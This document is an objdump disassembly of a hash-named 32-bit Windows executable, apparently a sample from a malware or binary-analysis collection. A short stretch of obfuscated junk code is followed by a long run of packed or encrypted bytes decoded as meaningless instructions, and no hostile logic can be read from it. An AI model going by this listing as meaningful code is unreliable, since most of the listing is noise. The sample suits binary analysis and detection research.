
0edef898c9cb41d3dd8ee72b38c7832a1e2da3f6f1b3cda882ead2fc0727f850.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428287,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42832f,0x0
  401016:	mov    DWORD PTR ds:0x4282ff,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42824f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42832f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d84
  40104b:	mov    ecx,DWORD PTR ds:0x4283b7
  401051:	sub    DWORD PTR ds:0x42826b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428297
  40105e:	and    DWORD PTR ds:0x428253,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x4281df
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x4282d7
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42838f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x4282bb
  401089:	mov    edx,DWORD PTR ds:0x4283bb
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x42831f,ebx
  40109a:	and    DWORD PTR ds:0x428267,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx+0x2befcb3]
  4010b6:	lds    edx,FWORD PTR [edx+ebp*4]
  4010b9:	sbb    BYTE PTR [eax],bl
  4010bb:	sbb    BYTE PTR [eax],bl
  4010bd:	sahf   
  4010be:	adc    bl,BYTE PTR [eax]
  4010c0:	sbb    BYTE PTR [ecx],bl
  4010c2:	lods   eax,DWORD PTR ds:[esi]
  4010c3:	cld    
  4010c4:	sub    eax,eax
  4010c6:	mov    ?,eax
  4010c8:	mov    cl,0xf9
  4010ca:	clc    
  4010cb:	out    0x2e,al
  4010cd:	or     dl,bh
  4010cf:	mov    cl,0xb1
  4010d1:	adc    BYTE PTR [ebx],dl
  4010d3:	stc    
  4010d4:	pop    ss
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    esp,ebx
  40111b:	out    0x2c,eax
  40111d:	push   ds
  40111e:	pop    es
  40111f:	(bad)  
  401120:	stc    
  401121:	adc    esp,DWORD PTR [ebp+0x24]
  401124:	mov    ds:0x4fbd4e88,eax
  401129:	dec    ebx
  40112a:	je     0x401159
  40112c:	xchg   esp,eax
  40112d:	or     edx,DWORD PTR [ebx]
  40112f:	inc    esp
  401130:	add    BYTE PTR [edi+0x4fdb4ec4],bl
  401136:	fistp  QWORD PTR [ecx-0x4fdda6f0]
  40113c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40113d:	bswap  ebp
  40113f:	jae    0x401159
  401141:	in     eax,0x8c
  401143:	stos   BYTE PTR es:[edi],al
  401144:	mov    bh,0xa6
  401146:	mov    DWORD PTR [ecx-0x46],ebx
  401149:	outs   dx,DWORD PTR ds:[esi]
  40114a:	sub    eax,0xe1666379
  40114f:	aam    0x23
  401151:	mov    edx,0xddaab8f0
  401156:	xlat   BYTE PTR ds:[ebx]
  401157:	dec    esi
  401158:	outs   dx,DWORD PTR ds:[esi]
  401159:	push   edx
  40115a:	dec    ebp
  40115b:	mov    dh,0xe0
  40115d:	mov    esi,DWORD PTR [edx]
  40115f:	dec    esp
  401160:	inc    ecx
  401161:	retf   0x2c5f
  401164:	pop    edx
  401165:	popf   
  401166:	adc    eax,0xd2886477
  40116b:	mov    cl,0xa6
  40116d:	and    al,0x50
  40116f:	in     al,dx
  401170:	mov    ds:0xd33a4c70,eax
  401175:	retf   
  401176:	int3   
  401177:	aam    0x56
  401179:	pop    ss
  40117a:	(bad)  
  40117b:	push   ebx
  40117c:	sub    eax,0xf2416051
  401181:	inc    ecx
  401182:	and    eax,0xc78bb335
  401187:	data16 ja 0x4011f6
  40118a:	and    bl,BYTE PTR [eax+0x4a]
  40118d:	adc    eax,0x6ddcec2e
  401192:	dec    esp
  401193:	xchg   ebp,eax
  401194:	jecxz  0x401183
  401196:	enter  0x1d4c,0x9f
  40119a:	push   cs
  40119b:	hlt    
  40119c:	xor    edx,DWORD PTR [ebx+0x1a]
  40119f:	fadd   st(4),st
  4011a1:	sbb    al,0x2c
  4011a3:	int3   
  4011a4:	sub    bl,al
  4011a6:	and    al,0x24
  4011a8:	cdq    
  4011a9:	imul   ebx,ecx,0x2b
  4011ac:	pop    ss
  4011ad:	popf   
  4011ae:	into   
  4011af:	mov    esi,0xa76075c7
  4011b4:	cmp    DWORD PTR [ebp+0x2a],ebp
  4011b7:	adc    dh,al
  4011b9:	lahf   
  4011ba:	lea    esi,[ecx]
  4011bc:	test   al,0x2f
  4011be:	push   ebp
  4011bf:	or     al,BYTE PTR [ebx]
  4011c1:	lds    ebp,FWORD PTR [ecx]
  4011c3:	inc    esi
  4011c4:	cld    
  4011c5:	loope  0x4011db
  4011c7:	push   ds
  4011c8:	adc    DWORD PTR [esi-0x265352ed],0xcd73e6cb
  4011d2:	scas   al,BYTE PTR es:[edi]
  4011d3:	ror    eax,1
  4011d5:	js     0x401177
  4011d7:	stos   BYTE PTR es:[edi],al
  4011d8:	dec    esp
  4011d9:	xor    DWORD PTR [edi-0x45],esi
  4011dc:	jge    0x40122a
  4011de:	call   0x7730dadb
  4011e3:	pop    ss
  4011e4:	add    al,0x7f
  4011e6:	pop    ss
  4011e7:	js     0x401250
  4011e9:	lods   eax,DWORD PTR ds:[esi]
  4011ea:	adc    esi,DWORD PTR [edx]
  4011ec:	inc    ebx
  4011ed:	inc    ebx
  4011ee:	sahf   
  4011ef:	mov    edx,eax
  4011f1:	or     al,0xb7
  4011f3:	xchg   ebx,eax
  4011f4:	retf   0x8ccb
  4011f7:	push   eax
  4011f8:	addr16 jp 0x4011ce
  4011fb:	stc    
  4011fc:	jl     0x401232
  4011fe:	loopne 0x40124d
  401200:	mov    esp,0x92874370
  401205:	pusha  
  401206:	stos   BYTE PTR es:[edi],al
  401207:	fsubr  DWORD PTR [ebp+0x10]
  40120a:	aam    0x1d
  40120c:	jmp    0x401213
  40120e:	add    eax,0xbcac15bb
  401213:	xor    ebx,DWORD PTR [esp+edx*2+0x572ca0c4]
  40121a:	cmp    DWORD PTR [edx-0x39],edx
  40121d:	mov    bh,0xe3
  40121f:	xchg   ebx,eax
  401220:	cbw    
  401222:	clc    
  401223:	add    eax,DWORD PTR [ebx+0x2181a350]
  401229:	fnclex 
  40122b:	dec    ebp
  40122c:	dec    ebx
  40122d:	push   es
  40122e:	loopne 0x401278
  401230:	mov    ecx,0xf9e0bdd2
  401235:	pop    edx
  401236:	pop    ss
  401237:	popa   
  401238:	jle    0x40125b
  40123a:	pop    ss
  40123b:	fisubr DWORD PTR [ebx-0x7d5d1cba]
  401241:	mov    ss,WORD PTR [edx-0xd]
  401244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401245:	mov    esi,esi
  401247:	pop    esp
  401248:	and    eax,0x818a8a0c
  40124d:	dec    edx
  40124e:	push   0x5b18603d
  401253:	sbb    eax,esp
  401255:	jmp    0x4012a2
  401257:	jp     0x401225
  401259:	sub    dl,cl
  40125b:	mov    ebp,0x110708fb
  401260:	mov    edx,0xb1900640
  401265:	mov    dl,0xc
  401267:	pusha  
  401268:	xor    al,0xc2
  40126a:	push   esp
  40126b:	jns    0x40120f
  40126d:	fadd   QWORD PTR [ebp+0x57]
  401270:	xchg   esi,eax
  401271:	sbb    cl,BYTE PTR [ecx]
  401273:	mov    ds:0xc88fb680,al
  401278:	and    ebx,DWORD PTR [ecx]
  40127a:	xchg   esp,eax
  40127b:	rcl    BYTE PTR [edx+0x65],cl
  40127e:	repz cld 
  401280:	cmp    BYTE PTR [ebp+edi*1-0x38],dh
  401284:	loop   0x401272
  401286:	sar    DWORD PTR [eax],0x74
  401289:	jnp    0x401233
  40128b:	pop    esp
  40128c:	mov    es,WORD PTR [edi-0x14]
  40128f:	mov    ebx,0xd315b591
  401294:	rcr    ebp,cl
  401296:	xchg   ebx,eax
  401297:	icebp  
  401298:	xchg   edi,eax
  401299:	fidivr DWORD PTR [ecx]
  40129b:	test   eax,0x1d7b7372
  4012a0:	mov    al,0xad
  4012a2:	test   eax,0x14914b9c
  4012a7:	and    edi,DWORD PTR [esi+0x70]
  4012aa:	or     bl,BYTE PTR [edx]
  4012ac:	xor    eax,0x7eb5aabb
  4012b1:	xchg   ebx,eax
  4012b3:	adc    BYTE PTR [bx+si-0x78],0x3d
  4012b8:	outs   dx,DWORD PTR ds:[esi]
  4012b9:	mov    edx,0x994b379c
  4012be:	push   ss
  4012bf:	pop    es
  4012c0:	sbb    al,0x2a
  4012c2:	or     ecx,DWORD PTR [ebp+esi*1-0x44e010ac]
  4012c9:	enter  0xc4cd,0x22
  4012cd:	and    ch,ah
  4012cf:	pop    ds
  4012d0:	imul   ebx,DWORD PTR [ebx+0x5da8749b],0xdf57beb6
  4012da:	pusha  
  4012db:	imul   edx,DWORD PTR [edx+0x606b7565],0xffffff87
  4012e2:	jno    0x4012f8
  4012e4:	mov    esp,0x8fe4948
  4012e9:	iret   
  4012ea:	dec    esi
  4012eb:	sub    cl,BYTE PTR [ebx]
  4012ed:	and    edi,ebp
  4012ef:	sub    ebp,esi
  4012f1:	or     BYTE PTR [ebx+0x76],cl
  4012f4:	xchg   ebx,eax
  4012f5:	ss sub al,0x13
  4012f8:	or     edx,DWORD PTR [ebx+0x74c9c535]
  4012fe:	pop    ebp
  4012ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401300:	and    eax,0x6362e8c7
  401305:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401307:	jae    0x4012ae
  401309:	add    eax,0xc9f770f1
  40130e:	ds es mov edi,0x2ce7db9b
  401315:	inc    eax
  401316:	push   edx
  401317:	adc    BYTE PTR [edx],dh
  401319:	mov    ebp,0xc37e9439
  40131e:	in     eax,0x99
  401320:	mov    ds:0xb48c53b8,al
  401325:	push   ecx
  401326:	outs   dx,DWORD PTR ds:[esi]
  401327:	enter  0x7bfb,0x74
  40132b:	adc    eax,0x4e3f5d8a
  401330:	push   edi
  401331:	inc    esp
  401332:	adc    dh,dh
  401334:	lea    esi,[edx+0x4d]
  401337:	cmp    DWORD PTR [edx-0x9f148cb],ecx
  40133d:	push   ebp
  40133e:	and    BYTE PTR [edi-0x69170b3f],ah
  401344:	mov    ?,WORD PTR [ecx]
  401346:	scas   al,BYTE PTR es:[edi]
  401347:	loop   0x4012fc
  401349:	ss sbb cl,dl
  40134c:	xchg   BYTE PTR [edi+0x7a656be3],cl
  401352:	mov    dh,0xad
  401354:	pop    ss
  401355:	cmp    eax,0xa7f29bba
  40135a:	bound  esi,QWORD PTR [esi+0x70c69b3e]
  401360:	test   DWORD PTR [edx+eiz*4],ebx
  401363:	adc    esp,DWORD PTR [eax-0x63]
  401366:	dec    edx
  401367:	pop    ebp
  401368:	xchg   ebp,eax
  401369:	sbb    BYTE PTR [ecx+0x1f54dc6],0x1e
  401370:	cld    
  401371:	push   ss
  401372:	sub    BYTE PTR [ebx-0x3b],al
  401375:	jo     0x4013ad
  401377:	cwde   
  401378:	push   ss
  401379:	inc    edx
  40137a:	and    BYTE PTR [ebx-0x5c40b60b],bh
  401380:	scas   al,BYTE PTR es:[edi]
  401381:	imul   ebp,ebx,0x37a9e7bf
  401387:	scas   al,BYTE PTR es:[edi]
  401388:	jns    0x4013fd
  40138a:	ds jge 0x40132c
  40138d:	test   BYTE PTR [eax+0x1c],0xe2
  401391:	lahf   
  401392:	repz (bad) 
  401394:	mov    ebp,0xb01fd7df
  401399:	in     eax,0x60
  40139b:	sub    eax,0xc4a4e0e5
  4013a0:	or     eax,0xcddc094c
  4013a5:	mov    edx,0x469d0f05
  4013aa:	pop    ss
  4013ab:	or     bl,BYTE PTR [ecx-0x7281a15c]
  4013b1:	add    ecx,DWORD PTR [ecx]
  4013b3:	ins    BYTE PTR es:[edi],dx
  4013b4:	xor    eax,0x2f6faf6d
  4013b9:	imul   ebx,DWORD PTR [esi+0x50],0x26626757
  4013c0:	daa    
  4013c1:	mov    DWORD PTR [edi+0x6628e40c],edi
  4013c7:	popa   
  4013c8:	test   edi,0xf1e9ca1d
  4013ce:	imul   ebx,DWORD PTR [ebp+0xe],0x5d
  4013d2:	stos   BYTE PTR es:[edi],al
  4013d3:	div    ecx
  4013d5:	mov    ebp,0x2ee8e3b4
  4013da:	test   al,0xdb
  4013dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013dd:	and    dh,al
  4013df:	or     ah,BYTE PTR [ecx+0x3c]
  4013e2:	xor    ah,dh
  4013e4:	pusha  
  4013e5:	pop    ecx
  4013e6:	xchg   esi,eax
  4013e7:	push   0x7264e1fd
  4013ec:	and    ch,BYTE PTR [ebx+0x2a]
  4013ef:	add    dh,BYTE PTR ds:0xdc11174d
  4013f5:	mov    ecx,0x98bd65bb
  4013fa:	int3   
  4013fb:	out    0x4b,eax
  4013fd:	gs ja  0x401471
  401400:	pushf  
  401401:	dec    esp
  401402:	xchg   edx,eax
  401403:	jl     0x40140f
  401405:	(bad)  
  401406:	mov    ds:0xcfa81008,eax
  40140b:	pop    DWORD PTR [edi+edi*8+0x651efb37]
  401412:	outs   dx,BYTE PTR ds:[esi]
  401413:	hlt    
  401414:	mov    cl,0x27
  401416:	mov    edx,ss
  401418:	ror    BYTE PTR [esi+eax*1-0x67b26871],0xc2
  401420:	xchg   edx,eax
  401421:	ret    
  401422:	sub    al,0x38
  401424:	mov    ecx,0xd5b18fff
  401429:	mov    ebx,0xb81a1b3d
  40142e:	(bad)  
  401430:	ret    
  401431:	stos   DWORD PTR es:[edi],eax
  401432:	fisub  WORD PTR [ecx-0x57]
  401435:	ficomp WORD PTR [esi+0x4dd045bb]
  40143b:	push   0xffffffd7
  40143d:	test   BYTE PTR [ebp-0x3ebd6aee],bl
  401443:	test   DWORD PTR [esi-0x57],ebp
  401446:	test   DWORD PTR [eax+0x6a],edi
  401449:	xchg   ebx,eax
  40144a:	xchg   esp,eax
  40144b:	int3   
  40144c:	arpl   WORD PTR [ecx+0x5415c825],bx
  401452:	test   BYTE PTR [edx+0x498ff225],cl
  401458:	ss or  al,0x11
  40145b:	or     ah,BYTE PTR [ecx+edx*1+0x7540bf00]
  401462:	mov    eax,0x96017626
  401467:	scas   eax,DWORD PTR es:[edi]
  401468:	mov    esi,0x907628e3
  40146d:	or     DWORD PTR [edx-0xaf56028],esp
  401473:	or     BYTE PTR [edx-0x5ef6f40a],dh
  401479:	ins    DWORD PTR es:[edi],dx
  40147a:	push   esp
  40147b:	lods   al,BYTE PTR ds:[esi]
  40147c:	xchg   DWORD PTR [ebx+0x73719dfc],edx
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x42837f,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x4282bb
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x42830b,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42823b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428263,0x0
  4014da:	mov    DWORD PTR ds:0x42823f,ecx
  4014e0:	mov    DWORD PTR ds:0x428303,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42817b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428263,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d88
  40151c:	mov    edx,DWORD PTR ds:0x4282db
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428353
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x4281af
  401537:	mov    edi,DWORD PTR ds:0x428357
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp-0x3e25d590]
  401569:	mov    al,0x9e
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x39181812],bl
  401573:	push   esi
  401574:	mov    al,0x31
  401576:	jmp    0x6c81:0x961c557c
  40157d:	cmp    bl,BYTE PTR [esi-0x6b]
  401580:	pop    edx
  401581:	stos   BYTE PTR es:[edi],al
  401582:	ds xor bh,dl
  401585:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  401587:	adc    eax,0x62a2dd2c
  40158c:	call   edi
  40158e:	push   ds
  40158f:	scas   eax,DWORD PTR es:[di]
  401591:	inc    ecx
  401592:	pop    esi
  401593:	stos   DWORD PTR es:[edi],eax
  401594:	fisttp DWORD PTR [ecx-0x13ab4fe9]
  40159a:	or     al,0x89
  40159c:	inc    ebp
  40159d:	pop    es
  40159e:	retf   
  40159f:	aaa    
  4015a0:	cs pop esp
  4015a2:	fidivr WORD PTR [edi+0xf13fb45]
  4015a8:	sub    eax,0x5493b40e
  4015ad:	adc    eax,0x66680367
  4015b2:	les    ecx,FWORD PTR [edi+0x17]
  4015b5:	aam    0xd7
  4015b7:	xor    esp,DWORD PTR [edx+0x5b]
  4015ba:	in     eax,0x81
  4015bc:	ret    
  4015bd:	fisub  WORD PTR [edi+edi*4]
  4015c0:	fcomp  QWORD PTR [ebx]
  4015c2:	mov    ecx,0x411593ed
  4015c7:	int3   
  4015c8:	xor    edi,DWORD PTR [ecx-0x31ea788e]
  4015ce:	inc    esp
  4015cf:	push   edx
  4015d0:	in     al,0x96
  4015d2:	xor    BYTE PTR [eax+0x47],ah
  4015d5:	push   ecx
  4015d6:	iret   
  4015d7:	mov    ds:0xd7ba78a7,al
  4015dc:	mov    bl,0x55
  4015de:	outs   dx,BYTE PTR ds:[esi]
  4015df:	jns    0x4015ee
  4015e1:	fisttp DWORD PTR [ecx-0x50]
  4015e4:	(bad)  
  4015e5:	mov    ds:0xe414ca80,al
  4015ea:	shl    edi,0xfe
  4015ed:	lock sahf 
  4015ef:	sub    al,0x12
  4015f1:	cld    
  4015f2:	mov    al,0xb5
  4015f4:	daa    
  4015f5:	push   eax
  4015f6:	sub    al,0x65
  4015f8:	out    dx,al
  4015f9:	xchg   esp,eax
  4015fa:	(bad)  [edi]
  4015fc:	mov    esi,0x6f1aac0b
  401601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401602:	xchg   ecx,eax
  401603:	adc    bl,cl
  401605:	pop    es
  401606:	addr16 aas 
  401608:	mov    ah,0x26
  40160a:	fisttp DWORD PTR [edx]
  40160c:	fwait
  40160d:	mov    dh,0x83
  40160f:	xor    al,0xeb
  401611:	jg     0x40162e
  401613:	sbb    eax,0x88dff574
  401618:	shl    esi,cl
  40161a:	scas   al,BYTE PTR es:[edi]
  40161b:	add    ebp,DWORD PTR [eax]
  40161d:	and    ebx,DWORD PTR [ebx+0x38a2e9bc]
  401623:	push   0x106389ee
  401628:	loopne 0x401665
  40162a:	sbb    ecx,DWORD PTR [ecx-0x3f]
  40162d:	test   eax,0x87cbf7f3
  401632:	dec    edi
  401633:	dec    ecx
  401634:	icebp  
  401635:	es mov cl,0x40
  401638:	push   edi
  401639:	xchg   ebx,eax
  40163a:	imul   edi,DWORD PTR [edx-0x1010d414],0xffffffa5
  401641:	fild   WORD PTR [edi-0x395b40b9]
  401647:	adc    DWORD PTR [edi],ebp
  401649:	inc    ebx
  40164a:	(bad)  
  40164b:	setne  BYTE PTR [edi]
  40164e:	cmp    BYTE PTR [esi],0x7f
  401651:	jg     0x401666
  401653:	adc    BYTE PTR [ecx+eax*2-0xf],bh
  401657:	(bad)  
  401659:	scas   al,BYTE PTR es:[edi]
  40165a:	mov    WORD PTR [edx],fs
  40165c:	fmul   DWORD PTR [edx+0x74]
  40165f:	pop    esp
  401660:	push   0x9c5bed1c
  401665:	inc    esi
  401666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401667:	dec    ebx
  401668:	cmp    ebx,ebp
  40166a:	mov    dh,0x3
  40166c:	or     eax,0x774e85ea
  401671:	ror    ch,1
  401673:	sbb    DWORD PTR [edx-0x16935307],ebp
  401679:	jp     0x4016c1
  40167b:	out    0x1d,al
  40167d:	repz jl 0x40163a
  401680:	or     al,0xa2
  401682:	and    eax,0x15d4b68e
  401687:	stc    
  401688:	adc    ah,BYTE PTR [edi+ebp*1]
  40168b:	pop    esp
  40168c:	mov    esp,0xa01fbe8a
  401691:	jno    0x401711
  401693:	push   ecx
  401694:	adc    DWORD PTR [edx],esi
  401696:	push   ds
  401697:	in     eax,0x2c
  401699:	mov    ebp,0xa70214f0
  40169e:	xor    bh,bh
  4016a0:	gs jecxz 0x40162b
  4016a3:	jae    0x4016dd
  4016a5:	xchg   esp,eax
  4016a6:	mov    edx,0xeddb9d6d
  4016ab:	pop    eax
  4016ac:	rcl    BYTE PTR [edx-0x12],1
  4016af:	mov    WORD PTR [edi],es
  4016b1:	mov    edi,0x562a05c9
  4016b6:	mov    ecx,0x9b9f97f3
  4016bb:	retf   
  4016bc:	jge    0x4016c9
  4016be:	cmp    al,0xc8
  4016c0:	mov    cl,0xf7
  4016c2:	aas    
  4016c3:	(bad)  
  4016c5:	push   edx
  4016c6:	sbb    al,0x1b
  4016c8:	mov    ebx,0xc29923f7
  4016cd:	aaa    
  4016ce:	clc    
  4016cf:	inc    edx
  4016d0:	sub    eax,0xd6eeef63
  4016d5:	test   DWORD PTR [esp+edx*2+0x3e],ecx
  4016d9:	xlat   BYTE PTR ds:[ebx]
  4016da:	inc    edx
  4016db:	test   BYTE PTR [eax+0x60e54387],dh
  4016e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016e2:	jae    0x401707
  4016e4:	fcomp  DWORD PTR [edx]
  4016e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016e7:	loope  0x40166e
  4016e9:	push   ecx
  4016ea:	sbb    eax,0xbcb58ff4
  4016ef:	sub    ah,BYTE PTR [edi-0x65]
  4016f2:	fisub  WORD PTR [ebx]
  4016f4:	mov    eax,0x2cf18e35
  4016f9:	xchg   ebx,eax
  4016fa:	loope  0x401721
  4016fc:	xchg   esp,eax
  4016fd:	xchg   esi,eax
  4016fe:	out    0x6e,eax
  401700:	lahf   
  401701:	dec    ebx
  401702:	sub    al,0x9b
  401704:	icebp  
  401705:	retf   
  401706:	frstor [ecx]
  401708:	pop    ecx
  401709:	and    eax,0x5ce63fd0
  40170e:	adc    al,0x95
  401710:	cld    
  401711:	dec    ebp
  401712:	mov    bl,0xe0
  401714:	jp     0x40175b
  401716:	sub    BYTE PTR [ecx+ebp*8],0x9f
  40171a:	inc    ecx
  40171b:	pop    ebx
  40171c:	rcr    BYTE PTR [ebp+0x26],0xda
  401720:	out    0x97,al
  401722:	dec    ecx
  401723:	int    0xc5
  401725:	aad    0x13
  401727:	ret    0x67e6
  40172a:	inc    ebp
  40172b:	dec    edi
  40172c:	xlat   BYTE PTR ds:[ebx]
  40172d:	and    BYTE PTR [ebp+0x20],al
  401730:	push   edx
  401731:	push   esi
  401732:	aaa    
  401733:	dec    esi
  401734:	repz aas 
  401736:	popa   
  401737:	ins    DWORD PTR es:[edi],dx
  401738:	add    cl,0xc0
  40173b:	test   al,0x0
  40173d:	sub    eax,0x5b5d0817
  401742:	xor    dl,BYTE PTR [edx-0x78b1701f]
  401748:	pop    esp
  401749:	stos   BYTE PTR es:[edi],al
  40174a:	int    0x48
  40174c:	ins    DWORD PTR es:[edi],dx
  40174d:	lock out dx,eax
  40174f:	push   eax
  401750:	dec    edx
  401751:	xor    esi,DWORD PTR [esi]
  401753:	(bad)
  401757:	inc    esp
  401758:	adc    edi,DWORD PTR [ebx-0x4e]
  40175b:	mov    al,ds:0xe892b68b
  401760:	jno    0x4017b3
  401762:	inc    esi
  401763:	aaa    
  401764:	adc    edx,DWORD PTR [ebx-0x68406e07]
  40176a:	cmc    
  40176b:	add    ch,BYTE PTR [esi-0x1656772e]
  401771:	pop    ss
  401772:	add    ebp,DWORD PTR [esi+0x6bb5d054]
  401778:	cli    
  401779:	enter  0x3b41,0xa8
  40177d:	sub    DWORD PTR [eax],0x39
  401780:	cmp    DWORD PTR [ebp+0x66],0xffffffaf
  401784:	shl    DWORD PTR [ebx-0x40654d44],1
  40178a:	adc    al,0xfa
  40178c:	fwait
  40178d:	aad    0x5f
  40178f:	mov    bh,0x7c
  401791:	dec    eax
  401792:	popf   
  401793:	pcmpeqw mm1,mm5
  401796:	ja     0x401809
  401798:	out    dx,eax
  401799:	cmp    esi,DWORD PTR [edi+0x5386e93d]
  40179f:	js     0x401779
  4017a1:	add    BYTE PTR [edx],cl
  4017a3:	jmp    0x3db1:0x7c607c5a
  4017aa:	jl     0x401761
  4017ac:	cmc    
  4017ad:	cmp    BYTE PTR [ebx-0x13],cl
  4017b0:	jle    0x401765
  4017b2:	test   al,0xf6
  4017b4:	ins    BYTE PTR es:[edi],dx
  4017b5:	jmp    0x4017e1
  4017b7:	jmp    0x6e01:0x706eaf1f
  4017be:	mov    eax,0x691b2ec4
  4017c3:	mov    dl,0x72
  4017c5:	dec    ebp
  4017c6:	xor    eax,0x12ac8e83
  4017cb:	jge    0x4017dd
  4017cd:	out    0x3a,eax
  4017cf:	int    0xb6
  4017d1:	ror    BYTE PTR [ebp+0x43],0x90
  4017d5:	jns    0x401834
  4017d7:	add    ebp,ebp
  4017d9:	cli    
  4017da:	mov    esp,DWORD PTR [edx+ebx*2-0x79b33e35]
  4017e1:	rcl    DWORD PTR [bx+si-0x6eba],1
  4017e6:	cli    
  4017e7:	ja     0x4017ac
  4017e9:	jmp    0xdba09d9d
  4017ee:	iret   
  4017ef:	mov    ds:0x440b06c3,eax
  4017f4:	es mov bh,0x3a
  4017f7:	jle    0x401851
  4017f9:	dec    eax
  4017fa:	mov    ds:0xedf2cdb0,eax
  4017ff:	popf   
  401800:	jg     0x401823
  401802:	and    eax,DWORD PTR [edi-0x42c59615]
  401808:	or     BYTE PTR [ecx],al
  40180a:	std    
  40180b:	cld    
  40180c:	jle    0x401824
  40180e:	adc    al,0x12
  401810:	lods   eax,DWORD PTR ds:[si]
  401812:	out    dx,eax
  401813:	adc    esp,DWORD PTR [esi]
  401815:	je     0x40186c
  401817:	xor    edx,eax
  401819:	jl     0x4017ce
  40181b:	cs push edi
  40181d:	inc    edx
  40181e:	jle    0x40180e
  401820:	and    ebx,edx
  401822:	arpl   WORD PTR [ebx+0x5ddd9aad],dx
  401828:	dec    esp
  401829:	iret   
  40182a:	outs   dx,DWORD PTR ds:[esi]
  40182b:	ja     0x401823
  40182d:	fld    QWORD PTR [ecx+edi*1]
  401830:	inc    ebx
  401831:	les    ecx,FWORD PTR [eax]
  401833:	cmp    DWORD PTR [esi-0x5c],edi
  401836:	stos   DWORD PTR es:[edi],eax
  401837:	cwde   
  401838:	aas    
  401839:	add    eax,0x72274849
  40183e:	pop    esi
  40183f:	pusha  
  401840:	ret    0xe636
  401843:	xchg   edi,eax
  401844:	ss jmp 0x40183a
  401847:	push   ebp
  401848:	test   BYTE PTR [eax-0x16],0x2c
  40184c:	sbb    al,al
  40184e:	gs mov ch,0xb8
